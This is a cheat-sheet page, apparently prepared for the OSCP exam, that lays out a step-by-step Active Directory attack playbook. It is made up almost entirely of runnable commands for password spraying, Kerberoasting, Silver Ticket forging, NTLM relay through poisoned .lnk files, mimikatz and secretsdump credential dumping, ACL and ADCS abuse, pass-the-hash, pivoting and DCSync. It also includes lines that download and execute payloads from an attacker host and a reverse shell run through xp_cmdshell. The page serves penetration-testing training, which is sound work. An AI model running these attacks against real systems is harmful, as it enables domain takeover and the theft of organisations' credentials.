---
title: "AD Playbook"
date: 2026-06-20
weight: 100
draft: false
summary: "A single linear attack flow for the OSCP AD set. Work through the phases in order and use only one method per task."
---

A single linear attack flow for the OSCP AD set. Work through the PHASEs in order and use only one method per task.

- Source: https://heretek.dev/oscp-cheatsheet/active-directory-playbook/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
- Replace `DC_IP`, `DOMAIN`, `USER`, `PASS`, `KALI_IP`, `FQDN`, etc. in the code with the values you found

## Mentor advice — always escape ! in passwords

```bash
# If the password contains " ! ", always escape it as \!.
# Even wrapping in ' ' causes problems at command execution and ! is not read correctly.

nxc smb 10.10.10.10 -u offsec -p "Password1\!"
# nxc smb 10.10.10.10 -u offsec -p 'Password1!' does not work properly.
```

## Emergency response when stuck

- Have creds, no shell → spray SMB + WinRM + RDP across every machine
- Have a shell, no path → read every SMB share, grep transcripts, dump creds, re-enumerate as the new user
- Stuck for more than 30 minutes → update the creds table. Move to another box. Come back later.
- Cannot reach the internal network → Ligolo-NG pivot from the compromised host
- Cannot crack the hash → try PtH right away. Or shadow creds / ForceChangePassword
- Kerberos fails → `sudo ntpdate DC_IP` first. Use IPs instead of hostnames.

## Exam-day flow

1. Setup — /etc/hosts, ntpdate, terminal logging
2. Scan — nmap every machine, build the network map
3. Enumerate from Kali — ldapsearch, nxc smb/ldap, share listing
4. Get a shell — creds from spraying → evil-winrm / psexec
5. Enumerate on the box — PowerView, files, transcripts, history
6. Dump creds — secretsdump, mimikatz, LSASS
7. Spray new creds — every cred against every machine
8. Find the path — ACL abuse / ADCS / delegation
9. DA — DCSync or PtH to the DC

Every 30 minutes: update the creds table. Anything new to spray? Any machine untouched?

## CREDS table (record everything)

Spray immediately when you find new creds:

```bash
echo -e 'user1\nuser2' > users.txt
echo -e 'Pass1\nPass2' > passes.txt
nxc smb IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
nxc winrm IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
nxc rdp IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
# When using hashes:
nxc smb IPs -u USER -H 'HASH' --continue-on-success
```

## Building wordlists by situation

```bash
# Pattern: season + year
# Useful when there are password rotation, seasonal passwords, company policy, or recent-year hints
for year in {2022..2026}; do
  for season in Spring Summer Fall Winter; do
    echo "${season}${year}"
  done
done > seasons_years.txt
```

Version with symbols:

```bash
for year in {2022..2026}; do
  for season in Spring Summer Fall Winter; do
    for symbol in '' '!' '@' '#'; do
      echo "${season}${year}${symbol}"
    done
  done
done > seasons_years_symbols.txt
```

## PHASE 0 — Setup (first 5 minutes)

```bash
# Build /etc/hosts from an IP list
echo -e 'DC_IP\nMS01_IP\nMS02_IP' > ips.txt
nxc smb ips.txt --generate-hosts-file /tmp/hosts
sudo tee -a /etc/hosts < /tmp/hosts

# Make sure the DC is in /etc/resolv.conf
nameserver 10.10.10.10      # add the DC IP to /etc/resolv.conf

# Time sync (required for Kerberos)
sudo ntpdate -u DC_IP

# Start logging
script -a exam_ad_log.txt
```

## PHASE 1 — Enumerate from KALI

### 1a. Anonymous LDAP

```bash
ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' | head -50
```

### 1b. After getting your first creds

```bash
ldapdomaindump -u 'DOMAIN\\USER' -p 'PASS' DC_IP -o ldap-dump/
nxc smb $ip -u '' -p '' --users
# Save usernames to a file:
nxc smb $ip -u '' -p '' --users | tee nxc_users_raw.txt | awk '$1=="SMB" && $5 !~ /^\[|\-Username\-/ {print $5}' | sort -u > users.txt      # check the description field for passwords
nxc smb DC_IP -u USER -p 'PASS' --groups
nxc smb DC_IP -u USER -p 'PASS' --shares
nxc smb DC_IP -u USER -p 'PASS' --pass-pol   # check before spraying
nxc smb DC_IP -u USER -p 'PASS' -M spider_plus

nxc ldap DC_IP -u USER -p 'PASS' -M laps
nxc ldap DC_IP -u USER -p 'PASS' -M adcs
nxc ldap DC_IP -u USER -p 'PASS' --trusted-for-delegation
# Auto-generate /etc/hosts from AD
nxc smb ips.txt -u USER -p 'PASS' -d DOMAIN --generate-hosts-file /tmp/hosts
```

### BloodHound — run first, right after your first creds

On Kali:

```bash
bloodhound-python -u 'USER' -p 'PASS' -ns DC_IP -d DOMAIN -c All
# Output: 6 JSON files (users, groups, computers, domains, gpos, ous) in the current directory

# ADCS data — not included in bloodhound-python -c All. Run separately:
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# Output: 1 zip file

# BloodHound CE upload: drag the 6 JSON files + 1 zip into the File Ingest tab
# Then mark your user as Owned -> Shortest Paths from Owned Principals (shows ACL + ADCS edges)
```

On Windows (SharpHound — when Kali cannot reach the DC):

```powershell
certutil -urlcache -f http://KALI/SharpHound.exe C:\Windows\Temp\SharpHound.exe
C:\Windows\Temp\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Windows\Temp\

# Or in memory (no disk artifacts):
IEX(New-Object Net.WebClient).DownloadString('http://KALI/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\

# Bring the results back: evil-winrm download, or base64 encoding
```

BloodHound queries (run in this order):

1. Mark your user as Owned
2. Shortest Paths from Owned Principals — your attack path (important)
3. Shortest Paths to Domain Admins
4. Find All Kerberoastable Users
5. Find AS-REP Roastable Users
6. Find Workstations where Domain Users can RDP
7. Find Computers where Domain Users are Local Admin
8. Find Principals with DCSync Rights

Custom Cypher (paste into Raw Query):

```text
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
MATCH (u:User) WHERE u.hasspn=true RETURN u
MATCH p=()-[:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN p
MATCH (m:Computer) RETURN m
```

BloodHound edge cheat sheet:

- MemberOf: the user belongs to this group → inherits the group's rights
- AdminTo: local admin on this box → psexec/wmiexec/evil-winrm
- HasSession: a user logged into this box → compromise the box then dump that user's creds
- CanRDP: can RDP to this box → RDP then hunt for cached creds
- GenericAll: full control → password reset, add to group, set SPN, shadow creds
- GenericWrite: can modify attributes → set an SPN then Kerberoast, or shadow creds
- WriteOwner: can change the owner → take ownership -> GenericAll -> abuse
- WriteDacl: can modify permissions → grant yourself GenericAll -> abuse
- ForceChangePassword: can reset the password → reset then log in as that user
- AddMember: can add to the group → add yourself
- DCSync: can dump all hashes → secretsdump → done (important)

### 1c. SMB shares — list first, download later

```bash
# Recursive listing only, no download
smbclient //IP/SHARE -U 'DOMAIN/USER%PASS' -c 'recurse ON; ls'

# Priority files: PowerShell_transcript.*.txt, *.ps1, *.kdbx, *.config, *.xml, *.log

# Targeted download
smbclient //IP/SHARE -U 'DOM/USER%PASS' -c 'recurse ON; prompt OFF; mask *.ps1; mget *; mask *.txt; mget *; mask *.config; mget *'

# grep everything
grep -riE 'password|credential|secret|ConvertTo-SecureString|PSCredential' .

# Search contents without downloading
smbmap -H IP -u USER -p 'PASS' -d DOMAIN -R SHARE -A 'password|secure|credential|transcript|PSCredential'
```

### 1d. SYSVOL (GPP cpassword)

```bash
smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER%PASS' -c 'recurse;prompt;mget *'
grep -ri cpassword .
gpp-decrypt 'CPASSWORD_VALUE'

# Or:
nxc smb DC_IP -u USER -p 'PASS' -M gpp_password
```

### 1e. ADCS + Delegation

```bash
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
impacket-findDelegation 'DOMAIN/USER:PASS' -dc-ip DC_IP
```

## PHASE 2 — Credential attacks

### AS-REP Roasting

```bash
# Without creds (needs a username list)
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# With creds
impacket-GetNPUsers 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### Silver Ticket — procedure and variants

- Conditions to try: Kerberoast crack succeeded + you have the service account password/hash + normal login fails or gives no meaningful access
- Basic rule: use the FQDN for the Kerberos identity. Use IPs or tunnels only for `-target-ip`

Information needed:

- Domain name
- Domain SID
- Service account password or NTLM hash
- Target FQDN
- Target IP / tunnel endpoint
- SPN
- User to impersonate
- (Optional) group RID

#### Getting the domain SID

Remove the last RID from the `whoami /all` or `whoami /user` output and you have the SID.

On Kali:

```bash
lookupsid.py DOMAIN/USER:'PASS'@DC_IP
```

#### Password → NTLM

```bash
pypykatz crypto nt 'PASSWORD'
```

Example:

```bash
pypykatz crypto nt 'Summer2024!'
```

#### MSSQL Silver Ticket — basic

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn MSSQLSvc/FQDN:1433 -user-id 500 Administrator
```

Load the ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### MSSQL connection — direct

```bash
proxychains impacket-mssqlclient -k -no-pass DOMAIN/Administrator@FQDN -target-ip TARGET_IP -port 1433
```

#### MSSQL connection — local tunnel

Use when the service is forwarded locally:

```text
Kali 127.0.0.1:1433 -> internal target:1433
```

Command:

```bash
proxychains impacket-mssqlclient -k -no-pass DOMAIN/Administrator@FQDN -target-ip 127.0.0.1 -port 1433
```

#### MSSQL verification

```text
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If sysadmin:

```text
enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
```

Reverse shell:

```text
EXEC xp_cmdshell 'powershell -exec bypass -enc BASE64_PAYLOAD';
```

Syntax note: `xp_cmdshell 'whoami'` does not work; you need EXEC and a semicolon, like `EXEC xp_cmdshell 'whoami';`.

#### MSSQL Silver Ticket — custom group RID

Use when the default ticket connects as guest/unprivileged, or a suspicious group exists. Examples of suspicious groups: Administrators, SQL Admins, MSSQL Admins, IT Database Admins, Server Operators, Account Operators.

Forge with the group RID:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn MSSQLSvc/FQDN:1433 -user-id 500 -groups RID Administrator
```

Load again:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### CIFS Silver Ticket variant

Use when the SPN/service is SMB/CIFS. Forge:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn cifs/FQDN -user-id 500 Administrator
```

Load:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

Use:

```bash
proxychains smbclient -k //FQDN/C$
```

Or:

```bash
proxychains impacket-psexec -k -no-pass DOMAIN/Administrator@FQDN -target-ip TARGET_IP
```

Even with a local tunnel, keep the Kerberos identity as the FQDN and put the IP/tunnel in the option the tool supports.

#### HOST / WSMAN variants

Use only when the service path requires HOST or WinRM/WSMAN. Forge HOST:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn HOST/FQDN -user-id 500 Administrator
```

Forge WSMAN:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn WSMAN/FQDN -user-id 500 Administrator
```

Load:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### Common fixes

- Use `MSSQLSvc/FQDN:1433` for the SPN (not `MSSQL/FQDN`)
- The Kerberos identity is in the form `DOMAIN/User@FQDN`
- Use the IP or 127.0.0.1 only for `-target-ip`
- If mssqlclient tries DOMAIN:88, that is a sign the ticket SPN does not match
- If a direct IP fails but the tunnel works, use `-target-ip 127.0.0.1`
- If you connect but are guest/unprivileged, retry with `-groups RID`
- Kerberos fails → run `ntpdate DC_IP`, check /etc/hosts
- If the klist SPN is wrong, delete the ccache and re-forge

#### Decision flow

```text
Crack the service account via Kerberoast
  ↓ normal login fails or no shell
  ↓ convert password → NTLM
  ↓ obtain the domain SID
  ↓ forge a Silver Ticket with the exact SPN
  ↓ load the ccache
  ↓ connect with the FQDN identity
  ↓ put the reachable IP/tunnel in -target-ip
  ↓ check privileges
  ↓ if guest/unprivileged, retry with a custom group RID
```

#### Key rule

If you crack a service account but normal login fails, do not throw it away. Treat the password/hash as a Kerberos service key and forge a Silver Ticket with the exact SPN. (important)

### Password Spraying

```bash
# Check the lockout policy before spraying
nxc smb DC_IP -u USER -p 'PASS' --pass-pol

# Spray
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'CompanyName2024!'
nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success --no-bruteforce
```

### Responder (LLMNR/NBT-NS)

```bash
sudo responder -I tun0 -v
# Force auth via MSSQL: EXEC xp_dirtree '\\\\KALI\\share'
# Crack: hashcat -m 5600 (no PtH, must crack)
```

### NTLM Relay

- Allowed: ntlmrelayx + Responder as a listener + file-based coercion
- Restricted: LLMNR/NBT-NS/mDNS poisoning (Responder's default mode)
- Only use Responder with poisoning disabled in Responder.conf

```bash
# 1. Find a writable share that users browse
smbclient //TARGET/SHARE -U 'DOMAIN\USER'

# 2. Create a poisoned .lnk with ntlm_theft
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py -g lnk -s KALI_IP -f loot
smbclient //TARGET/SHARE -U 'DOMAIN\USER' -c 'put loot.lnk'

# 3. Find relay targets (SMB signing disabled)
nxc smb SUBNET/24 --gen-relay-list relay_targets.txt

# 4. Start the relay listener (socks proxy for reuse)
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# 5. Wait for a victim to open that folder in Explorer
# Type 'socks' in the ntlmrelayx console to see active sessions

# 6. Use the relay session with proxychains
# Last line of /etc/proxychains.conf: socks4 127.0.0.1 1080
proxychains -q impacket-secretsdump DOMAIN/USER@TARGET -no-pass
proxychains -q nxc smb TARGET -u USER -p '' --sam
```

Other coercion methods (all allowed — no poisoning):

```bash
# MSSQL (anyone with connect rights, including non-sysadmin):
EXEC master..xp_dirtree '\\KALI_IP\x'
EXEC master..xp_fileexist '\\KALI_IP\x'

# Drop on a writable share:
#   .lnk, .url, .scf, desktop.ini pointing at \\KALI_IP\x
```

## PHASE 3 — Getting a shell

```bash
# WinRM (5985) - cleanest
evil-winrm -i IP -u USER -p 'PASS'
evil-winrm -i IP -u USER -H 'NT_HASH'

# PsExec (445, SYSTEM shell, loud)
impacket-psexec 'DOMAIN/USER:PASS'@IP
impacket-psexec 'DOMAIN/USER'@IP -hashes :NTHASH

# WmiExec (135, stealthier)
impacket-wmiexec 'DOMAIN/USER:PASS'@IP
impacket-wmiexec 'DOMAIN/USER'@IP -hashes :NTHASH

# DCOM (MMC20.Application — from a compromised Windows box when WmiExec/PsExec are blocked)
# Requires local admin on TARGET. Runs in the current session, no service creation.
\$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'))
\$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',\$null,'/c CMD_HERE','7')

# RDP
xfreerdp /u:USER /p:'PASS' /d:DOMAIN /v:IP /cert:ignore +clipboard
```

(The two DCOM lines are published in the source with `\$` escapes. When typing them into a PowerShell console, drop the backslash, as in `$com`, `$null`.)

Group → tool mapping:

- Remote Management Users → evil-winrm
- Remote Desktop Users → xfreerdp
- Local Administrators → psexec / wmiexec / evil-winrm
- Domain Users only → SSH if available, check what you can reach

## PHASE 4 — Enumerate from the compromised Windows box

### First commands on every box

```text
whoami /all
hostname
ipconfig /all
netstat -ano | findstr LISTENING
net user /domain
net group "Domain Admins" /domain
net localgroup Administrators
```

### net.exe / dsquery (built-in, no upload needed)

```text
net user /domain
net user USERNAME /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain

dsquery user -name "*"
dsquery group -name "*"
dsquery computer
```

### PowerView (upload PowerView.ps1 first)

```powershell
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainPolicy
Get-DomainController

# Users
Get-DomainUser | select samaccountname,description
Get-DomainUser -SPN                     # Kerberoastable
Get-DomainUser -PreauthNotRequired      # AS-REP Roastable

# Groups
Get-DomainGroup | select samaccountname
Get-DomainGroupMember 'Domain Admins'
Get-DomainGroupMember 'Backup Operators'

# Computers
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainComputer | Resolve-IPAddress

# Access + ACL
Find-LocalAdminAccess
Find-InterestingDomainAcl -ResolveGUIDs
Get-NetSession -ComputerName TARGET

# Kerberoastable
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
Convert-SidToName S-1-5-21-...-1104
```

### Windows-side attack tools (upload to the target)

```powershell
# Enumerate logged-on users on another box

# Password spraying from inside the domain
Spray-Passwords.ps1

# Rubeus - AS-REP Roasting
.\Rubeus.exe asreproast /outfile:asrep.txt

# Rubeus - Kerberoasting
.\Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus - request a TGT with a hash (overpass-the-hash)
.\Rubeus.exe asktgt /user:USER /rc4:NTHASH /domain:DOMAIN /outfile:ticket.kirbi
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz - dump cached credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mimikatz - dump local SAM (token::elevate before lsadump::sam)
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Mimikatz - dump LSA secrets (important - often holds plaintext service account passwords)
# Look for: _SC_servicename entries (plaintext service passwords)
#           MACHINE.ACC (this machine's computer account hash)
#           DPAPI system keys, autologon creds, saved RDP passwords
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# Mimikatz - DCSync from the compromised box
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\\Administrator" "exit"

# Mimikatz - pass-the-hash (spawn a new process as the target user)
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell" "exit"

# Mimikatz - export tickets from memory
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# PowerView - targeted attack on an edge you found
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
Set-DomainObject -Identity TARGET -SET @{serviceprincipalname='fake/spn'}
Add-DomainGroupMember -Identity 'GROUP' -Members USER
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity USER -Rights DCSync

# PowerView - Kerberoast via pipeline
Get-DomainUser -SPN | ? {$_.samaccountname -ne "krbtgt"} | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII kerberoast.hashes
```

### File + credential hunting

```powershell
# PowerShell history
Get-ChildItem -Path C:\Users -Recurse -Filter ConsoleHost_history.txt -EA SilentlyContinue | Get-Content

# Saved creds
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Config files + KeePass
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -EA SilentlyContinue | Select-String "pass" -List | Select Path
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -EA SilentlyContinue | Select FullName

# Common directories
ls C:\Users\Public
ls C:\Temp
ls C:\Windows\Temp
ls C:\inetpub
```

## PHASE 5 — Credential dumping (after admin)

```bash
# From Kali - SAM + LSA + DCC2
impacket-secretsdump 'DOMAIN/USER:PASS'@IP
impacket-secretsdump 'DOMAIN/USER'@IP -hashes :NTHASH

# DCSync (DC only, requires privileges)
impacket-secretsdump 'DOMAIN/Administrator:PASS'@DC_IP -just-dc

# nxc shortcuts
nxc smb IP -u USER -p 'PASS' --sam      # local hashes
nxc smb IP -u USER -p 'PASS' --lsa      # LSA secrets
nxc smb DC_IP -u USER -p 'PASS' --ntds  # all domain hashes (DC only)
```

```powershell
# On Windows - Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\Administrator" "exit"
```

Read all of the output: SAM hashes, DCC2 (slow), LSA secrets, SC entries (plaintext service passwords).

## PHASE 6 — ACL abuse

Decision table:

- WriteOwner: USER target → take ownership -> GenericAll -> shadow creds / GROUP target → take ownership -> GenericAll -> add yourself
- GenericAll: USER target → shadow creds / password reset / set SPN / GROUP target → add yourself as a member
- GenericWrite: USER target → shadow creds / targeted Kerberoast / UPN swap / GROUP target → modify attributes
- WriteDacl: USER target → grant yourself GenericAll then proceed / GROUP target → grant yourself GenericAll, add yourself
- ForceChangePassword: USER target → reset the password directly / GROUP target → not applicable
- AddMember: USER target → not applicable / GROUP target → add yourself directly

### WriteOwner -> USER

```bash
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set owner TARGET USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add genericAll TARGET USER
certipy-ad shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET -dc-ip DC_IP
```

### WriteOwner -> GROUP

```bash
# Same two steps: take ownership, grant yourself rights, then add yourself to the group
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set owner GROUPNAME USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add genericAll GROUPNAME USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add groupMember 'GROUPNAME' USER
# Recheck BloodHound — what does GROUPNAME grant? (usually AdminTo / DCSync rights)
```

### GenericAll / GenericWrite -> USER

Verification of the reset is required: `nxc smb DC_IP -u TARGET -p NEW_PASS`

```bash
# 1. [OK] net rpc password (per BloodHound's abuse panel)
#    Replace every placeholder — DomainController, TargetUser, etc. are templates
net rpc password "TARGET" "NewP@ss123!" -U "DOMAIN"/"USER"%"PASS" -S "DC_IP"

# 2. [OK] rpcclient alternative
rpcclient -U 'DOMAIN/USER%PASS' DC_IP -c 'setuserinfo2 TARGET 23 NewP@ss123!'

# 3. [WARN] bloodyAD — may report success without actually applying
#    Only when 1 and 2 fail. Always verify by authenticating.
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set password TARGET 'NewP@ss123!'

# 4. [only when ADCS exists] Shadow credentials - confirm ADCS exists first
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# 'Found 0 certificate authorities' -> skip, ADCS is not deployed
certipy-ad shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET -dc-ip DC_IP

# 5. [GenericWrite or GenericAll] Targeted Kerberoast - quiet (preserves user logon)
python3 targetedKerberoast.py --dc-ip DC_IP -v -d DOMAIN -u USER -p 'PASS'
# Manual PowerView alternative (from the compromised Windows box, when impacket fails):
# Set-DomainObject -Identity TARGET -Set @{serviceprincipalname='nonexistent/spn'}
# Get-DomainUser TARGET | Get-DomainSPNTicket | fl
# Set-DomainObject -Identity TARGET -Clear serviceprincipalname
```

### WriteDacl -> DCSync

```bash
dacledit.py -action write -rights DCSync -principal USER -target-dn 'DC=domain,DC=com' DOMAIN/USER:PASS -dc-ip DC_IP
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user Administrator
```

### ForceChangePassword

```bash
rpcclient -U 'DOMAIN/USER%PASS' DC_IP -c 'setuserinfo2 TARGET 23 NewP@ss123!'
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set password TARGET 'NewP@ss123!'
```

### AddMember

```bash
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add groupMember 'GROUP' USER
net rpc group addmem 'GROUP' USER -U 'DOMAIN/USER%PASS' -S DC_IP
```

## PHASE 7 — ADCS (certificate abuse)

```bash
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
```

### ESC1 — Enrollee supplies subject

```bash
certipy-ad req -u USER@DOMAIN -p 'PASS' -ca CA-NAME -template TEMPLATE -upn Administrator@DOMAIN -target DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 -> ESC1 — modify a privileged template

```bash
certipy-ad template -u USER@DOMAIN -hashes HASH -template TEMPLATE -dc-ip DC_IP -target DC_IP -write-default-configuration
certipy-ad req -u USER@DOMAIN -hashes HASH -ca CA-NAME -template TEMPLATE -upn Administrator@DOMAIN -target DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC9 — UPN swap

```bash
certipy-ad account update -u USER@DOMAIN -p 'PASS' -user TARGET -upn Administrator -dc-ip DC_IP
certipy-ad req -u TARGET@DOMAIN -hashes HASH -ca CA-NAME -template TEMPLATE -dc-ip DC_IP
certipy-ad account update -u USER@DOMAIN -p 'PASS' -user TARGET -upn TARGET@DOMAIN -dc-ip DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

Always `sudo ntpdate -u DOMAIN` before certipy. Use an IP instead of a hostname for `-target`.

## PHASE 8 — PtH / PtT

### Pass-the-Hash (NTLM — 32 hex chars)

```bash
evil-winrm -i IP -u USER -H 'NTHASH'
impacket-psexec 'DOMAIN/USER'@IP -hashes :NTHASH
impacket-wmiexec 'DOMAIN/USER'@IP -hashes :NTHASH
nxc smb IP -u USER -H 'HASH'
nxc smb IP -u USER -H 'HASH' --local-auth
```

PtH does not work against NTLMv2 (Responder) — that must be cracked.

### Overpass-the-Hash

```bash
impacket-getTGT -dc-ip DC_IP -hashes :NTHASH DOMAIN/USER
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP DOMAIN/USER@TARGET.DOMAIN
```

### Pass-the-Ticket

```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/USER@dc01.domain.local
```

## PHASE 9 — LAPS

```bash
nxc ldap DC_IP -u USER -p 'PASS' -M laps
# LAPS v1 (older, plaintext attribute)
ldapsearch -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASS' -b 'DC=domain,DC=com' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
# LAPS v2 (2023+, may be a JSON blob: {"n":"Administrator","p":"plaintext"})
ldapsearch -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASS' -b 'DC=domain,DC=com' '(msLAPS-Password=*)' msLAPS-Password
```

LAPS passwords differ per computer and are reset periodically. Use them as the local admin credential for that box.

## PHASE 10 — Pivoting (reaching the internal subnet)

```bash
# Ligolo-NG (preferred)
sudo ip tuntap add user USERNAME mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On the target:
agent.exe -connect KALI_IP:11601 -ignore-cert

# Ligolo console:
session
ifconfig
start

# Kali routing:
sudo ip route add $TARGET/24 dev ligolo

# Callbacks through the tunnel:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## PHASE 11 — Domain Admin

```bash
# DCSync all domain hashes
impacket-secretsdump 'DOMAIN/USER:PASS'@DC_IP -just-dc
impacket-secretsdump 'DOMAIN/USER'@DC_IP -hashes :NTHASH -just-dc

# Shell on the DC
evil-winrm -i DC_IP -u Administrator -H NTHASH
impacket-psexec 'DOMAIN/Administrator'@DC_IP -hashes :NTHASH

# Proof
type C:\Users\Administrator\Desktop\proof.txt
```

### Constrained Delegation

```bash
impacket-getST -spn cifs/target.domain.com -impersonate Administrator DOMAIN/svcaccount:PASS -dc-ip DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@target.domain.com
```

## Key pattern — PowerShell transcript credential leak

The number one AD enumeration technique on exam day. If any domain user has SMB read access to a share containing logs/transcripts/monitoring directories, grep for ConvertTo-SecureString and PSCredential.

Characteristic patterns in transcript files:

- `ConvertTo-SecureString CLEARTEXT -AsPlainText -Force`
- `New-Object System.Management.Automation.PSCredential DOMAIN\Administrator`

Procedure:

1. `nxc smb IP -u USER -p PASS -d DOMAIN --shares`
2. For every non-default share you can read: `smbclient //IP/share -c 'recurse ON; ls'`
3. Prioritize PowerShell_transcript.*.txt files
4. Download the targets and grep for ConvertTo-SecureString first

There is a case where a low-privilege user found a domain admin plaintext password in PowerShell transcripts with nothing but share read access — run the transcript grep early.

Enumerate first, advanced attacks later.

## Quick reference

### Hash types

- NTLM (hashcat 1000): PtH works immediately
- NTLMv2 (hashcat 5600): captured by Responder — must crack
- Kerberoast (hashcat 13100): GetUserSPNs
- AS-REP (hashcat 18200): GetNPUsers
- DCC2 (hashcat 2100): cached hashes — slow

### Syntax traps

- bloodyAD hashes: `-p ':NTHASH'` (no `-hashes` flag)
- certipy-ad: use an IP instead of a hostname for `-target`
- evil-winrm `-H`: NT hash only (32 chars), not the LM:NT format
- If evil-winrm fails on the IP: try the domain name
- ntpdate: every time before Kerberos/cert operations
- users.txt: one per line, no comma separation
- C:\Temp may not exist: use C:\Windows\Temp\

### Common chain patterns

```text
creds -> ForceChangePassword -> GenericAll -> Kerberoast -> DCSync -> DA
creds -> WriteOwner group -> shadow creds -> GenericAll -> ESC9 -> DA
SYSVOL -> GPP cpassword -> gpp-decrypt -> Kerberoast -> DA
AS-REP Roast -> crack -> WriteDacl -> DCSync -> DA
```
